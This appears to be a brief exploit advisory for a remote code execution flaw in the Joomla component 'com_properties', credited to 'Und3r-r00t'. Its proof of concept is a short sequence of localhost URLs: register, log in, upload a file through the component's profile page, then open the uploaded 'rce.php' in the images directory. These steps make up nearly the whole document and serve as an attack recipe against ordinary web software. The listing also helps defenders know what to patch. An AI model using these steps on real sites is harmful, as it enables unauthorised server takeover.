
#Exploit Title: Joomla Component 'com_properties' File Upload/RCE

* Google Dork: NA


* Exploit Author: Und3r-r00t

* Tested on: Centos

* PoC  
  * register and login
  `http://localhost/index.php?option=com_user&task=register&Itemid=`
  
  `http://localhost/index.php?option=com_user&view=login`

  * Upload File 
  `http://localhost/index.php?option=com_properties&amp;view=profile&amp;Itemid=19`

  * File path
  `http://localhost/images/properties/profiles/rce.php`



twitter - @p33rl
